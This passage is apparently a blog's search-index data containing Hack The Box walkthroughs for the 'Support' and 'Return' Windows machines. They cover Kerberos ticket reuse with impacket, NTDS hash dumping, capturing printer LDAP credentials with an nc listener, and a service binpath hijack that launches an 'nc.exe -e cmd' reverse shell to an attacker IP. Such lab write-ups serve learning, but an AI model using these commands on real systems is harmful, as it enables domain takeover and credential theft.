piping it into another file called admin.kirbi:\nbase64 -d b64.ticket \u0026gt; admin.kirbi .kirbi is the extension required for us to convert our ticket. We then use impacket-ticketconvert to convert our .kirbi to a .ccache\nccache: (Credential Cache) files are used in Linux systems to store Kerberos tickets and other security credentials obtained through the Kerberos authentication process. impacket-ticketConverter admin.kirbi admin.ccache Set the KRB5CCNAME Variable \u0026amp; get root\nKR5CCNAME is an Environment variable used by Kerberos 5 (KRB5) used by Linux as pointer to the .ccache file KRB5CCNAME=admin.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass 5. Pillaging/Persistence: Initially I try and run Secrets-Dump but it\u0026rsquo;s not playing ball:\nSo I upload LaZagne.exe:\nI find nothing other than the machine hash, which will not be crackable as these are handled by the OS itself, extremely long and rotated often. Dumping NTDS via netexec:\nSo now I have all the hashes from NTDS, including Domain Admin, I have complete domain ownership. Verify The Admin Hash Works:\nIt works, so now I can conclude this box as I can regain entry anytime via the Admin hash or any of the hashes I have. Lessons Learned: What did I learn? I learned about XOR and reverse engineering the encryption. I was rusty on kerberos so took me some time to get my head around RBCD again as I haven\u0026rsquo;t done it in some time. I re-learned about S4U attacks as it had been some time. What silly mistakes did I make? I was an idiot and didn\u0026rsquo;t change my hosts file for ages after a box reboot and couldn\u0026rsquo;t figure out why my LDAP binds were not working. Should have dumped NTDS prior to running LaZagne.exe \u0026amp; Secrets-Dump. Thoughts: Easy my ass….reverse engineering a binary, doing an RBCD kerberos attack that should work but doesn\u0026rsquo;t so we have to export tickets to access remotely. For me this was an easy to medium box. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/support-box\/"
    },
    
    "http:\/\/localhost:1313\/aboutme\/": {
        "title": "about me",
        "tags": [],
        "content": "Hack the Planet Can you hear me? Is this thing on?\nI’m Bloodstiller, an ethical hacker with a passion for security and privacy. My focus is on Active Directory (AD) security, working to protect enterprise networks and identity management systems.\nI\u0026rsquo;m always exploring new techniques and keeping up with the latest threats. This blog serves as a way for me to share insights, tips, and experiences from my journey in hacking.\nCurrently, my primary focus is providing Hack The Box walkthroughs. These detailed guides not only help others but also deepen my own understanding of various concepts and attacks. Each walkthrough showcases my personal approach to solving challenges.\nThe Goals of This Blog: Provide practical examples of ethical hacking techniques. Help fellow security enthusiasts improve their skills. Demonstrate real-world applications of cybersecurity concepts. Foster a community built on knowledge sharing and continuous learning. Understand the concepts myself. Realistic Troubleshooting, Bones And All: My walkthroughs include all the troubleshooting steps I go through when things don’t go as planned. Many walkthroughs jump from point A to point B effortlessly, but the reality is often much messier—especially for beginners. I leave it all in, bones and all, to show the real process, and help set realistic expectations for those entering the industry or tackling CTFs.\nUnfortunately, I’m just \u0026amp; I mean just, smart enough to know I’m dumb.\nGet in contact: – Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/aboutme\/"
    },
    
    "http:\/\/localhost:1313\/walkthroughs\/return-box\/": {
        "title": "Return HTB Walkthrough",
        "tags": ["Box","HTB","Easy","Windows","LDAP",],
        "content": "Hack The Box Return Walkthrough/Writeup: https://app.hackthebox.com/machines/Return How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists Initial NMAP Scan \u0026amp; Start-Up Responder: I tend to run a very basic nmap scan initially so I can look for low hanging fruit that I can enumerate whilst my more in-depth scans are running:\nIn this case it\u0026rsquo;s very useful as we can see that ldap is runing which means we can do a significant amount of enumeration if anonymous bind is enabled. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:12:51 zsh ❯ nmap $box Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 11:23 BST Nmap scan report for 10.129.95.241 Host is up (0.035s latency). Not shown: 988 closed tcp ports (conn-refused) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Nmap done: 1 IP address (1 host up) scanned in 12.51 seconds Start Responder:\nAs this is a windows domain computer, I start responder running in the background. The liklihood of me getting any hits on a single box are slim but we dont\u0026rsquo; know if it\u0026rsquo;s been set to call out. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:13:40 zsh ❯ sudo responder -wd -v -I tun0 [sudo] password for kali: __ Domain Name Discovery: Domain Name is return.local Whilst my NMAP Scan runs I use ldapsearch to discover the naming contexts of the domain, doing this enables me to check for further fine grained information. kali in ~ 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:13:51 zsh ❯ ldapsearch -H ldap://$box -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=return,DC=local namingcontexts: CN=Configuration,DC=return,DC=local namingcontexts: CN=Schema,CN=Configuration,DC=return,DC=local namingcontexts: DC=DomainDnsZones,DC=return,DC=local namingcontexts: DC=ForestDnsZones,DC=return,DC=local # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 Brief explanation of naming contexts: Every Active Directory domain has a naming context (NC). The root of the naming context is represented by the domains distinguised name (DN/dn). This is often referred to as the \u0026ldquo;NC Head\u0026rdquo;. For example in this case, the return.local domain DN would be \u0026ldquo;DC=return,DC=local\u0026rdquo; as can be seen in the first returned line. This is the root of the directory that all other DN\u0026rsquo;s will be built on top of, e.g. if we had a user called Lex Huberman, their DN may be \u0026ldquo;CN=lex.huberman,CN=Users,DC=return,DC=local\u0026rdquo; (we can see the NC is the base/root that all other DN\u0026rsquo;s for the domain are built upon.) Checking For Ldap Anonymous bind: As we are dealing with ldap, as mentioned previously, I want to check if Anonymous Bind is enabled.\nIf you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials. We can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapchecker It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in ~/Desktop/WindowsTools 🐍 v3.11.9 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 11:31:36 zsh ✖ python3 ldapchecker.py $box Attempting to connect to 10.129.95.241 with SSL... Failed to connect with SSL. Retrying without SSL... Connected successfully. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=return,DC=local CN=Configuration,DC=return,DC=local CN=Schema,CN=Configuration,DC=return,DC=local DC=DomainDnsZones,DC=return,DC=local DC=ForestDnsZones,DC=return,DC=local We have the domain functionaility level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=return,DC=local The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: Any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere’s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) So it appears it\u0026rsquo;s a printer server site of some sort. What is also interesting is the CN name \u0026ldquo;Configuration\u0026rdquo;, this could imply that it is still to be configured. Which is interesting as things that are still being configured may not have had thorough security stanards actioned. serverName: CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local schemaNamingContext: It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. But wait there\u0026rsquo;s more…. Enumerating the Webserver \u0026amp; Getting a foothold: We can see a webserver running on the host: This is interesting as it\u0026rsquo;s a domain joined printer and this is the admin/settings page. For this printer to be able to operate and be used on the domain, it will have credentials stored. So we should be able to extract these. I stand up an nc listener \u0026amp; listen on ldap port 389 sudo nc -lvnp 389 I then enter my email address and click \u0026ldquo;Update\u0026rdquo; I immediately get a connection anda password is displayed. I verify the password is valid using netexec: Ldap Bind Information: I had wireshark running at this time to capture any interesting traffic \u0026amp; here we can see the POST request from the server \u0026amp; the subsequent LDAP BIND REQUEST to our malicious server. We can actually gather a significant amount of information from this packet. The version of LDAP being used. This particular printer is using 2, however the most recent version is 3. The name of the client/user making the request: return\\svc-printer The Authentication method: (0) Simple aka as clear text passwords. I connect to the host via Evil-Winrm: I want to be fully transparent here, I didn\u0026rsquo;t go straight to checking evil-winrm and connecting. Instead I messed around with SMB and enumerating the shares, which is not a bad thing but I should have realistically checked for this earlier. I hear you say \u0026ldquo;but why are you telling me this?\u0026rdquo; well, there are a lot of videos and writeups for boxes where people go \u0026ldquo;I did A,B,C \u0026amp; that\u0026rsquo;s how I owned this box in 3 minutes flat\u0026rdquo; but that\u0026rsquo;s not the reality of it, and it sets unrealistic expectations for people. In reality, you try various things and they fail and then you realize you missed something and do that. Granted this will improve with time and methodology however It\u0026rsquo;s not true when you are starting out \u0026amp; that is okay.\nI connect \u0026amp; check my users privs:\nI can see that I have the SeBackupPrivilege which effectivley means I have NT AUTHORITY SYSTEM.\nI check my group membership and can see I am part of the Server Operators:\nThis is a high-privileged group: The Server Operators group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.\nWe get the below capabilites by being part of this group: Interactive sign-in to servers. Create and delete network shared resources. Start and stop services. Back up and restore files. As seen in SeBackupPrivilege \u0026amp; SeRestorePrivilege Format the hard disk drive. Shut down the computer. \u0026ldquo;why SeBackupPrivilege\u0026rdquo; is dangerous: Here is why SeBackupPrivilege is so dangerous if we control a user who has the privilege: The privilege will let us copy ANY file from a folder, even if there is no access control entry (ACE) for us in the folder\u0026rsquo;s access control list (ACL) However, we can\u0026rsquo;t do this using the standard copy command. Instead, we need to programmatically copy the data, making sure to specify the FILE_FLAG_BACKUP_SEMANTICS flag. E.G. Use Diskshadow.exe Some more fun facts about this privilege: Members of the Backup Operators Group \u0026amp; Server Operators Group get this privilege by default: Provides read access to all files and directories for backup purposes, bypassing standard permissions. Allows a process to read any file, regardless of the file\u0026rsquo;s permissions. Used primarily for backup applications that need access to all files. Does not enable writing or deleting files, only reading. Security Considerations High potential for abuse if granted to unauthorized applications or users. Should be closely monitored and restricted to trusted applications and personnel. Path to NT Authority\\System course correction: Inititally I actually went down the path of dumping the registry hives for a SAM attack. As we do not have access to an actual domain controller so a DC Sync/Dumping NTDS.dit attack was no feasible. Just getting NT Locally would be enough to meet our needs. However when performing this attack I was successul in extracting the administrators hash but all pass the hash attacks (PTH) and attempts to login is as the administrator would not work, so the account login must be restricted locally. So now it\u0026rsquo;s a case of looking at the other capabilites that we have as members of the \u0026ldquo;Server Operators\u0026rdquo; Group, e.g. the ability to start \u0026amp; stop processes. Enumerating Services: I try various ways to enumerate the processes \u0026amp; services manually using inbuilt tools in windows, however these are all denied. Processes: Services: Trying SharpUp: Evil-Winrm: I didn\u0026rsquo;t know this previously bu as we are using evil-winrm it has the ability to enumerate services that are running by running the services command even if other methods do not work. Here we can see that the VGAutheService.exe binary is running as a privileged user/NT Authority System and the service name is VGAuthService I tried to enumerate if the service path was modifiable but all my efforts were denied. I am going to attempt to attack it anyway. I was able to query if I could stop it, which I can: Attacking the Bin Path \u0026amp; Getting System: I am going to see if I can modify the binaries path to point to a binary I control, e.g. NC or a reverse shell. I will then stop the service \u0026amp; restart it again. As the service runs as NT Authority\\System it should run my binary with elevate privileges. +Note+: Sometimes this is what it is, trying until we find the right route. Upload my binary, nc.exe Stand up my listener: Stop the process \u0026amp; ensure it has stopped: Modify the binary path to have cmd execute my nc.exe binary and connect back to my attack host: Explained: Initially I did just have the binpath be: sc.exe config VGAuthService binpath=\u0026quot;C:\\Users\\svc-printer\\Documents\\nc.exe -e cmd 10.10.14.131 9999\u0026quot; However it kept failing. After doing some digging I found out why. If we start a service process it will fail if the service MUST is not a Windows Service; which means the reverse shell will fail. Instead if we have cmd launch and then run our reverse shell even if the service fails our reverse shell will persist as it will be backgrounded. Information here: https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN Start the process: Profit Lessons Learned: What did I learn? I learned how to extract hardcoded LDAP credentials from hosts by using a malicious LDAP server. I learned that we can enumerate running services using evil-winrm. I learned that if we modify a service to run a custom binary it will fail unless we execute it using cmd as services will fail if they are not a Windows Service. Information here: https://learn.microsoft.com/en-gb/windows/win32/api/winsvc/nc-winsvc-lpservice_main_functiona?redirectedfrom=MSDN What silly mistakes did I make? I did not try and connect with Evil-Winrm sooner, this isn\u0026rsquo;t a terrible mistake as I was acively enumerating SMB but it is low hangin fruit that I could have seen sooner. I initially went after a local admin account, however this was not the right path to take. Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n", 
        "url": "http:\/\/localhost:1313\/walkthroughs\/return-box\/"
    },
    
    "http:\/\/localhost:1313\/categories\/": {
        "title": "Categories",
        "tags": [],
        "content": "", 
        "url": "http:\/\/localhost:1313\/categories\/"
    },
    
}
</script>
<script defer src="/js/lunr.js"></script>
<script defer src="/js/search.js"></script>

</footer>

</body>
</html>

